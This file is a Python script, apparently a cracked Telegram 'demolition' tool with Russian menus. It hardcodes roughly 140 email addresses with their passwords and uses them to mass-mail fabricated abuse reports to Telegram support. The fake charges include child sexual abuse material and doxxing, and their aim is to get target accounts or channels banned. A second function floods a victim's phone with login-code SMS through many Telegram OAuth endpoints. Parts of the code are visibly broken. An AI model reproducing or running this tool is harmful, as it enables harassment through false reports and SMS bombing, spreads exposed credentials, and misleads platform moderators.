# DECODED BY HYPER X SQUAD >>> TOP 1 
# @decoded_softs

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import time
import pyfiglet
import requests, fake_useragent


from termcolor import colored


banner = """

██╗░░░██╗██╗░░░░░████████╗██████╗░░█████╗░  ░██████╗███╗░░██╗░█████╗░░██████╗
██║░░░██║██║░░░░░╚══██╔══╝██╔══██╗██╔══██╗  ██╔════╝████╗░██║██╔══██╗██╔════╝
██║░░░██║██║░░░░░░░░██║░░░██████╔╝███████║  ╚█████╗░██╔██╗██║██║░░██║╚█████╗░
██║░░░██║██║░░░░░░░░██║░░░██╔══██╗██╔══██║  ░╚═══██╗██║╚████║██║░░██║░╚═══██╗
╚██████╔╝███████╗░░░██║░░░██║░░██║██║░░██║  ██████╔╝██║░╚███║╚█████╔╝██████╔╝
░╚═════╝░╚══════╝░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝  ╚═════╝░╚═╝░░╚══╝░╚════╝░╚═════╝░
"""

colored_banner = colored(banner, color='blue')
print(colored_banner)

senders = {
    "sg7548110@gmail.com": "qrei amdm xkpb jhrv",
    "dlatt7055@gmail.com": "tpzd nxle odaw uqwf",
    "dlyabravla655@gmail.com": "kprn ihvr bgia vdys",
    "shiltsaleisha552@hotmail.com": "560ucutelr",
    "pauline.kramer554@hotmail.com": "6ex2tEnT",
    "strkelle637@hotmail.com": "oysuet795",
    "stephane.eberle86@hotmail.com": "463yilerr463",
    "soldo.f@hotmail.com": "zL53qzwlf4",
    "yarmanrachael@hotmail.com": "YQ3pTGb79vA",
    "taunya.kotz@hotmail.com": "Kotz49Kotz",
    "resch.easter@hotmail.com": "Resch848",
    "roundxanthia82@hotmail.com": "2oFLeRzGNn",
    "w.kean97@hotmail.com": "3BzD8fQBpC",
    "onleyyahaira84@hotmail.com": "stAg29GEr",
    "vargaso.daniele@hotmail.com": "S64lipPeR",
    "andre.dottl@hotmail.com": "182ttirbo",
    "richn.izola00@hotmail.com": "ytlnobe326",
    "willb_inaya_154@hotmail.com": "1982Inaya1982",
    "chaddock_brunilda.1981@hotmail.com": "RNDILEBE366",
    "yergines1999@hotmail.com": "SM712lbfx",
    "rouge.cathy.88@hotmail.com": "Cathy19881988",
    "tarter.tasia@hotmail.com": "UNNYDU594",
    "regena.mclin96@hotmail.com": "mclin831831",
    "wynell_mcclean.86@hotmail.com": "8tybQNZWe",
    "shahid_winnifred@hotmail.com": "clitlonb730",
    "vinas.josette44@hotmail.com": "9VwvalwqDj8",
    "wat.juliet559@hotmail.com": "6ad6VERB",
    "todd.nieves86@hotmail.com": "ToddTodd37",
    "rosena.laulu@hotmail.com": "sq24uARe",
    "zanagilmour@hotmail.com": "3MediocRe",
    "shub_lala.1983@hotmail.com": "imPen6D8iNg",
    "yesenia.shingleton@hotmail.com": "Yesenia19821982",
    "orner.candy@hotmail.com": "363OlySleNI363",
    "yaelpaton65@hotmail.com": "PFelbfVC62",
    "elnalibe@hotmail.com": "cgD2K2tPn",
    "mendizabal_lela@hotmail.com": "688etoOIOI688",
    "ytuart.farida67@hotmail.com": "2dE8mand",
    "pras.cory@hotmail.com": "715dylususr",
    "bastida.harlie@hotmail.com": "cenyRQphT9C",
    "woolums.sharlene106@hotmail.com": "296woolums",
    "xanthippe.fi@hotmail.com": "402fiecke402",
    "quashitanika_90@hotmail.com": "597erenCL597",
    "oriana.roser_70@hotmail.com": "LlNw0qRgI",
    "rough.carey1986@hotmail.com": "oLEm6Y6w1",
    "antionette_nitka98@hotmail.com": "1998NITKA",
    "zoilaoakland89@hotmail.com": "Zoila1989",
    "spall.betty1986@hotmail.com": "c1A8NcEr",
    "mirabito.c@hotmail.com": "gL88iTtER",
    "petruzzelli.johnny@hotmail.com": "Johnny867",
    "luellearmida.1992@hotmail.com": "Ti1He072",
    "thresa.fa@hotmail.com": "f1eTBa6L",
    "maggie.heenan68@hotmail.com": "oyitlb204",
    "winafredwedding_2001@hotmail.com": "undeR91wEAr",
    "polizzi.catharine_83@hotmail.com": "2allO3cate",
    "roberto_paniagua96@hotmail.com": "98TORUCEL98",
    "ve.futch_70@hotmail.com": "1cRuS5ade",
    "vandorp_margarette76@hotmail.com": "1976Vandorp1976",
    "wecelina88@hotmail.com": "98weinWEIN",
    "raelynevener.68@hotmail.com": "1surve9illanCe",
    "rosel.aur@hotmail.com": "e8Xt2reME",
    "micki.enf@hotmail.com": "735tluldcl735",
    "revell.albert81@hotmail.com": "s1pecIAl",
    "wright.van@hotmail.com": "0sQ0by7varW",
    "lashay.shackelton@hotmail.com": "225Lashay225",
    "zainakimes.72@hotmail.com": "1972KIMES",
    "thedacosse@hotmail.com": "da8ta3Base",
    "tabitha.kopf66@hotmail.com": "iuE0m7vP",
    "retaslaymaker65@hotmail.com": "An6xexdr",
    "pennick.lasandra1990@hotmail.com": "nbstey298",
    "trefethen_etta@hotmail.com": "R3yOWdl3j",
    "eugenie.mckinzy@hotmail.com": "6mAYpfoiW",
    "onida_rook66@hotmail.com": "12rookROOK",
    "steven.tahlia965@hotmail.com": "1978TAHLIA1978",
    "shirleengualtier@hotmail.com": "573sybies",
    "shortt.al@hotmail.com": "70AlvaAlva",
    "genoveva.flinck@hotmail.com": "YDHKBzd4Cu4",
    "scheid.babara.92@hotmail.com": "575RLTBBI575",
    "katinato@hotmail.com": "tibnnib658",
    "jostenger@hotmail.com": "1992JOANIE",
    "torie.raymo82@hotmail.com": "X2bIO5mwD9P",
    "sheridan.currens71@hotmail.com": "557ULCUTUT",
    "faith.cabrales@hotmail.com": "noTo5ri1OUS",
    "schabbelva92@hotmail.com": "38veRifY",
    "vanderburhortencia@hotmail.com": "1658Hortencia",
    "rwillford.95@hotmail.com": "RENDA1995",
    "ivory.sinat@hotmail.com": "606cCrcYNT606",
    "nichillary76@hotmail.com": "qu0es1tIon",
    "rig_hildegard.1982@hotmail.com": "aY2X6pYe",
    "kawam.milly1980@hotmail.com": "408cUlUUR408",
    "wi_biby@hotmail.com": "bibyBIBY71",
    "audra.byram_66@hotmail.com": "616tnceltub616",
    "queta.genna@hotmail.com": "ac66cuSE",
    "tony_gund@hotmail.com": "923olsuti",
    "rmelonie.97@hotmail.com": "1520melonie",
    "pfaukristian894@hotmail.com": "fe1rOcious",
    "sigweedon94@hotmail.com": "JsPxidT4u",
    "tutwi.myong@hotmail.com": "733DOUBIRIN733",
    "pulanco.jesus@hotmail.com": "fzzbgYVBN3n",
    "nikl.yael@hotmail.com": "nIKS467nik",
    "adali.lory@hotmail.com": "lory2005",
    "quincyaryee@hotmail.com": "qUinCY1991",
    "tothyrush@hotmail.com": "eH9RHjaD",
    "kearney.l@hotmail.com": "Kearney250",
    "nlott.britney@hotmail.com": "2317BbBrItney",
    "sunderland.gigi.92@hotmail.com": "9272sUnderland",
    "vickymlott456@hotmail.com": "VickyLott1456",
    "sherley.olga@hotmail.com": "olga2002",
    'charlotte2850@hotmail.com': 'kelalu2850',
    'avyavya.vyaavy@mail.ru': 'zmARvx1MRvXppZV6xkXj',
    'gdfds98@mail.ru': '1CtFuHTaQxNda8X06CaQ',
    'dfsdfdsfdf51@mail.ru': 'SXxrCndCR59s5G9sGc6L',
    'aria.therese.svensson@mail.com': 'Zorro1ab',
    'taterbug@verizon.net': 'Holly1!',
    'ejbrickner@comcast.net': 'Pass1178',
    'teressapeart@cox.net': 'Quinton2329!',
    'liznees@verizon.net': 'Dancer008',
    'olajakubovich@mail.com': 'OlaKub2106OlaKub2106',
    'kcdg@charter.net': 'Jennifer3*',
    'bean_118@hotmail.com': 'Liverpool118!',
    'dsdhjas@mail.com': 'LONGHACH123',
    'robitwins@comcast.net': 'May241996',
    'sdgdfg56@mail.com': 'kenwood4201',
    'garrett.danelz@comcast.net': 'N11golfer!',
    'gillian_1211@hotmail.com': 'Gilloveu1211',
    'sunpit16@hotmail.com': 'Putter34!',
    'fdshelor@verizon.net': 'Masco123*',
    'yeags1@cox.net': 'Zoomom1965!',
    'amine002@usa.com': 'iScrRoXAei123',
    'bbarcelo16@cox.net': 'Bsb161089$$',
    'laliebert@hotmail.com': 'pirates2',
    'vallen285@comcast.net': 'Delft285!1!',
    'sierra12@email.com': 'tegen1111',
    'luanne.zapevalova@mail.com': 'FqWtJdZ5iN@',
    'kmay@windstream.net': 'Nascar98',
    'redbrick1@mail.com': 'Redbrick11',
    'ivv9ah7f@mail.com': 'K226nw8duwg',
    'erkobir@live.com': 'floydLAWTON019',
    'Misscarter@mail.com': 'ashtray19',
    'carlieruby10@cox.net': 'Lollypop789$',
    'blackops2013@mail.com': 'amason123566',
    'caroline_cullum@comcast.net': 'carter14',

}
receivers = ['sms@telegram.org', 'dmca@telegram.org', 'abuse@telegram.org',
             'sticker@telegram.org', 'support@telegram.org']


def menu():

    print(colored("			Разработчики:", 'red'),colored("NO AUTHORS", 'green'))
    print(colored("			Channel", 'red'),colored(" @decoded_softs", 'green'))
    print(colored("			Version:", 'red'),colored("CRCK 4", 'green'))
    
    print(colored("M", 'red'),colored("e", 'blue'),colored("n", 'yellow'),colored("u", 'cyan'),colored(":", 'magenta'))
    print(colored("<1>", 'white'),colored("Снос аккаунта", 'green'))
    print(colored("<2>", 'white'),colored("Снос канала", 'green'))
    print(colored("<3>"),colored("Спам кодом", 'green'))
    print(colored('<4>', 'white'),colored('Снос сессий', 'green'))
    print(colored('<5>', 'white'),colored('Разблокировать аккаунт', 'green'))

    choice = input(colored(">>>", 'blue'))
    return choice

def send_email(receiver, sender_email, sender_password, subject, body):
    try:
        msg = MIMEMultipart()
        msg['From'] = sender_email
        msg['To'] = receiver
        msg.attach(MIMEText(body, 'plain'))
        server = smtplib.SMTP('smtp.mail.ru', 587)
        server.starttls()
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, receiver, msg.as_string())
        time.sleep(3)
        server.quit()
        return True
    except Exception as e:
        return False


def main():
    sent_emails = 0
    choice = menu()
    if choice == '1':
        print(colored("<1>", 'white'),colored("Спам", 'green'))
        print(colored("<2>", 'white'),colored("Деанон", 'green'))
        print(colored("<3>", 'white'),colored("Троллинг", 'green'))
        print(colored("<4>", 'white'),colored("Премиум", 'green'))
        print(colored("<5>", 'white'),colored("Виртуальный номер", 'green'))
        comp_choice = input(colored(">>> ", 'blue'))
        if comp_choice in ["1", "2", "3"]:
            username = input(colored("Username: ", 'magenta'))
            id = input(colored("Telegram ID: ", 'magenta'))
            chat_link = input(colored("Ссылка на чат: ", 'magenta'))
            violation_link = input(colored("Ссылка на нарушение: ", 'magenta'))
            comp_texts = {
                "1": f"Здравствуйте, уважаемая поддержка. На вашей платформе я нашел пользователя который отправляет много ненужных сообщений - СПАМ. Его юзернейм - {username}, его айди - {id}, ссылка на чат - {chat_link}, ссылка на нарушения - {violation_link}. Пожалуйста примите меры по отношению к данному пользователю.",
                "2": f"Здравствуйте, уважаемая поддержка, на вашей платформе я нашел пользователя, который распространяет чужие данные без их согласия. его юзернейм - {username}, его айди - {id}, ссылка на чат - {chat_link}, ссылка на нарушение/нарушения - {violation_link}. Пожалуйста примите меры по отношению к данному пользователю путем блокировки его акккаунта.",
                "3": f"Здравствуйте, уважаемая поддержка телеграм. Я нашел пользователя который открыто выражается нецензурной лексикой и спамит в чатах. его юзернейм - {username}, его айди - {id}, ссылка на чат - {chat_link}, ссылка на нарушение/нарушения - {violation_link}. Пожалуйста примите меры по отношению к данному пользователю путем блокировки его акккаунта."
            }
            for sender_email, sender_password in senders.items():
                for receiver in receivers:
                    comp_text = comp_texts[comp_choice]
                    comp_body = comp_text.format(username=username.strip(), id=id.strip(), chat_link=chat_link.strip(),
                                                 violation_link=violation_link.strip())
                    send_email(receiver, sender_email, sender_password, 'Жалоба на аккаунт телеграм', comp_body)
                    print(colored(f"Отправлено на {receiver} от {sender_email}!", 'green'))
                    sent_emails += 14888
                    time.sleep(5)

      
        elif comp_choice in ["4", "5"]:
            username = input(colored("Username: ", 'magenta'))
            id = input(colored("Telegram Id: ", 'magenta'))
            comp_texts = {
                "4": f"Добрый день поддержка Telegram!Аккаунт {username} , {id} использует виртуальный номер купленный на сайте по активации номеров. Отношения к номеру он не имеет, номер никак к нему не относиться.Прошу разберитесь с этим. Заранее спасибо!",
                "5": f"Добрый день поддержка Telegram! Аккаунт {username} {id} приобрёл премиум в вашем мессенджере чтобы рассылать спам-сообщения и обходить ограничения Telegram.Прошу проверить данную жалобу и принять меры!"
            }

            for sender_email, sender_password in senders.items():
                for receiver in receivers:
                    comp_text = comp_texts[comp_choice]
                    comp_body = comp_text.format(username=username.strip(), id=id.strip())
                    send_email(receiver, sender_email, sender_password, 'Жалоба на пользователя телеграм', comp_body)
                    print(colored(f"Отправлено на {receiver} от {sender_email}!", 'green'))
                    sent_emails += 9999
                    time.sleep(5)


    elif choice == "2":

        print(colored("<1>", 'white'),colored("Персональные данные", 'green'))
        print(colored("<2>", 'white'),colored("Живодерство", 'green'))
        print(colored("<3>", 'white'),colored("18+", 'green'))
        print(colored("<4>", 'white'),colored("Price", 'green'))
        ch_choice = input(colored(">>> ", 'magenta'))

        if ch_choice in ["1", "2", "3", "4"]:
            channel_link = input(colored("Ссылка на канал: ", 'magenta'))
            channel_violation = input(colored("Ссылка на нарушение: ", 'magenta'))
            comp_texts = {
                "1": f"Здравствуйте, уважаемая поддержка телеграм. На вашей платформе я нашел канал, который распространяет личные данные невинных людей. Ссылка на канал - {channel_link}, сслыки на нарушения - {channel_violation}. Пожалуйста заблокируйте данный канал.",
                "2": f"Здравствуйте, уважаемая поддержка телеграма. На вашей платформе я нашел канал который распространяет жестокое обращение с животными. Ссылка на канал - {channel_link}, сслыки на нарушения - {channel_violation}. Пожалуйста заблокируйте данный канал.",
                "3": f"Здравствуйте, уважаемая поддержка телеграма. На вашей платформе я нашел канал который распространяет порнографию с участием несовершеннолетних. Ссылка на канал - {channel_link}, сслыки на нарушения - {channel_violation}. Пожалуйста заблокируйте данный канал.",
                "4": f"Здравствуйте,уважаемый модератор телеграмм,хочу пожаловаться вам на канал,который продает услуги доксинга, сваттинга. Ссылка на телеграмм канал:{channel_link} Ссылка на нарушение:{channel_violation} Просьба заблокировать данный канал."
            }

            for sender_email, sender_password in senders.items():
                for receiver in receivers:
                    comp_text = comp_texts[ch_choice]
                    comp_body = comp_text.format(channel_link=channel_link.strip(),
                                                 channel_violation=channel_violation.strip)
                    send_email(receiver, sender_email, sender_password, 'Жалоба на телеграм канал', comp_body)
                    print(colored(f"Отправлено на {receiver} от {sender_email}!", 'green'))
                    sent_emails += 100000
                    time.sleep(5)


    elif choice == '3':

        number = int(input(colored("Введите номер телефона: ", 'magenta')))
        count = 0

        try:
            for _ in range(3):                  
                user = fake_useragent.UserAgent().random
                headers = {'user-agent': user}

                requests.post(
                    'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
                    headers=headers, data={'phone': number})
                requests.post('https://translations.telegram.org/auth/request', headers=headers, data={'phone': number})
                requests.post('https://translations.telegram.org/auth/request', headers=headers, data={'phone': number})
                requests.post(
                    'https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write&return_to=https%3A%2F%2Ffragment.com%2F',
                    headers=headers, data={'phone': number})
                requests.post(
                    'https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write&return_to=https%3A%2F%2Ffragment.com%2F',
                    headers=headers, data={'phone': number})
                requests.post(
                    'https://oauth.telegram.org/auth?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&request_access=write&return_to=https%3A%2F%2Fbot-t.com%2Flogin',
                    headers=headers, data={'phone': number})
                requests.post(
                    'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
                    headers=headers, data={'phone': number})
                requests.post(
                    'https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
                    headers=headers, data={'phone': number})
                requests.post(
                    'https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23',
                    headers=headers, data={'phone': number})
                requests.post(
                    'https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin',
                    headers=headers, data={'phone': number})
                requests.post(
                    'https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F',
                    headers=headers, data={'phone': number})
                requests.post(
                    'https://oauth.telegram.org/auth/request?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&return_to=https%3A%%2Fbot-t.com%2Flogin',
                    headers=headers, data={'phone': number})
                requests.post(
                    'https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch',
                    headers=headers, data={'phone': number})
                requests.post(
                    'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin',
                    headers=headers, data={'phone': number})
                requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone': number})

                count += 1
                print(colored(f"Коды успешно отправлены", 'cyan'))
                print(colored(f"Всего циклов: {count} ", 'cyan'))
        except Exception as e:
            print('[!] Ошибка, проверьте вводимые данные:', e)



    elif choice == "4":
            numbers = input(colored(f"Номер телефона:",'magenta'))
            comp_texts = {
                "5": f"I'm trying to use my mobile number: {numbers} No one in the telegram says that it is blocked. Please help me. Please check my account, I haven't done anything wrong that could get me banned. I would appreciate it if you would unban my account Thank you"
            }

            for sender_email, sender_password in senders.items():
                for receiver in receivers:
                    comp_text = comp_texts[choice]
                    comp_body = comp_text.format(numbers=numbers.strip())
                    send_email(receiver, sender_email, sender_password, 'Я утерял свой аккаунт в телеграм', comp_body)
                    print(colored(f"Отправлено на {receiver} от {sender_email}!", 'red'))
                    sent_emails += 9999
                    time.sleep(5)
                    
                    
                    
    elif choice == "5":
            numbers = input(colored(f"Номер телефона",'magenta'))
            comp_texts = {
                "5": f"I'm trying to use my mobile number: {numbers} No one in the telegram says that it is blocked. Please help me. Please check my account, I haven't done anything wrong that could get me banned. I would appreciate it if you would unban my account Thank you"
            }

            for sender_email, sender_password in senders.items():
                for receiver in receivers:
                    comp_text = comp_texts[choice]
                    comp_body = comp_text.format(numbers=numbers.strip())
                    send_email(receiver, sender_email, sender_password, 'Я утерял свой аккаунт в телеграм', comp_body)
                    print(colored(f"Отправлено на {receiver} от {sender_email}!", 'red'))
                    sent_emails += 9999
                    time.sleep(5)

if __name__ == "__main__":
    main()